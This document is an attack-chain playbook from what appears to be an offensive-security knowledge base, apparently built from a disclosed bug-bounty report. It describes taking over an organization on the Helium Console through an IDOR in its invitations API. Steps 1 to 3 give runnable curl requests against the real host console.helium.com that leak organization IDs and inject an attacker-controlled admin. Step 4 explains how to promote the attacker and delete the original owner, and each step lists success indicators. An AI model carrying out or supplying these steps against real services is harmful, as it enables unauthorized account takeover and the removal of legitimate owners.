---
id: ac-helium-idor-takeover-835005
tags:
  - idor
  - privilege-escalation
  - organization-takeover
  - graphql
  - jwt
  - web
type: attack_chain
tools:
  - '[[tools/burp-suite]]'
tactics:
  - '[[Privilege Escalation]]'
  - '[[Lateral Movement]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/leak-target-organization-id-via-graphql-query]]'
  - '[[procedures/intercept-legitimate-invitation-request-with-burp-suite]]'
  - '[[procedures/modify-and-resend-invitation-to-target-organization]]'
  - '[[procedures/escalate-privileges-using-fake-admin-account]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:32:20.911Z'
description: >-
  Multi-stage attack exploiting an Insecure Direct Object Reference (IDOR) in
  the Helium Console /api/invitations endpoint to achieve full organization
  takeover by inviting a controlled fake account as admin and escalating
  privileges.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Organization Takeover via IDOR in Helium Console Invitations API

Multi-stage attack chain demonstrating a complete attack workflow exploiting an IDOR vulnerability in the Helium Console to leak organization IDs via GraphQL, manipulate invitation requests, and achieve full control over the target organization.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Leak Org ID via GraphQL] --> B[Intercept Invitation]
    B --> C[Modify and Send to Target]
    C --> D[Escalate and Takeover]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/burp-suite]]

### Target Environment

- Web platform with Helium Console
- GraphQL endpoint at /graphql
- API endpoint at /api/invitations
- Authenticated low-privileged (reader) access to target organization

### Initial Access Requirements

- Valid JWT token for a reader member of the target organization
- Network access to console.helium.com
- Controlled fake email account for invitation

## Detailed Attack Procedures

### Step 1: Leak Target Organization ID
procedure: [[procedures/leak-target-organization-id-via-graphql-query]]

**Objective**: Discover the UUID of the target organization where the attacker has reader access, enabling targeted IDOR exploitation.

**Instructions**: Execute the GraphQL query using [[commands/graphql-query-organizations]] to fetch organizations the authenticated user is a member of:

```bash
curl -X POST https://console.helium.com/graphql \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"operationName":"PaginatedOrganizationsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n organizations(page: $page, pageSize: $pageSize) {\n entries {\n ...OrganizationFragment\n __typename\n }\n totalEntries\n totalPages\n pageSize\n pageNumber\n __typename\n }\n}\n\nfragment OrganizationFragment on Organization {\n id\n name\n inserted_at\n __typename\n}"}'
```

**Expected Output**: JSON response containing organization entries with IDs, e.g., {"data":{"organizations":{"entries":[{"id":"cb23000e-65b3-4628-9ede-656ffa0d5aa8","name":"target"}]}}}

**Success Indicators**:
- Target organization UUID leaked (e.g., cb23000e-65b3-4628-9ede-656ffa0d5aa8)
- Response includes multiple organizations confirming membership

### Step 2: Intercept Legitimate Invitation Request
procedure: [[procedures/intercept-legitimate-invitation-request-with-burp-suite]]

**Objective**: Capture the structure of a valid invitation request to the attacker's own organization for later modification.

**Instructions**: Configure [[tools/burp-suite]] as a proxy, then send an invitation using [[commands/post-invitation-legitimate]] while intercepting:

```bash
curl -X POST https://console.helium.com/api/invitations \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"883b0a46-e4cf-4315-af4f-4226d1ada561"}}'
```

Intercept in Burp Suite before forwarding to capture headers and body.

**Expected Output**: Intercepted request with JSON body for own organization; do not forward yet.

**Success Indicators**:
- Request intercepted successfully in Burp Suite
- Valid invitation payload captured for modification

### Step 3: Modify and Resend Invitation to Target
procedure: [[procedures/modify-and-resend-invitation-to-target-organization]]

**Objective**: Exploit IDOR by altering the organization ID in the intercepted request to invite the fake account as admin to the target organization.

**Instructions**: In Burp Suite, modify the organization field in the intercepted request using the leaked ID, then forward using [[commands/post-invitation-modified]] structure:

```bash
curl -X POST https://console.helium.com/api/invitations \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"cb23000e-65b3-4628-9ede-656ffa0d5aa8"}}'
```

**Expected Output**: HTTP 201 Created response with membership details, e.g., {"id":"a0262e0c-7939-42dd-a4ec-e42dc2eeaeab","role":"admin"}

**Success Indicators**:
- Invitation accepted without authorization error
- Fake account added as admin to target org

### Step 4: Escalate Privileges and Takeover
procedure: [[procedures/escalate-privileges-using-fake-admin-account]]

**Objective**: Use the fake admin account to promote the original attacker to admin and remove the original owner, achieving full takeover.

**Instructions**: Log in with the fake account credentials, then use the console UI or API to update the original attacker's role to admin and delete the victim admin. No specific command; perform via authenticated session.

**Expected Output**: Updated memberships confirming admin role for attacker and removal of original owner.

**Success Indicators**:
- Attacker's role escalated to admin
- Original owner deleted from organization

## Attack Chain Summary

### Key Achievements

1. Leaked sensitive organization UUID via legitimate GraphQL query
2. Exploited IDOR to invite controlled account as admin to unauthorized organization
3. Achieved privilege escalation and full organization control

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Privilege Escalation]]

### MITRE ATT&CK Tactics

- [[Privilege Escalation]]
- [[Lateral Movement]]

---

*Last updated: 2023-10-01T00:00:00Z*
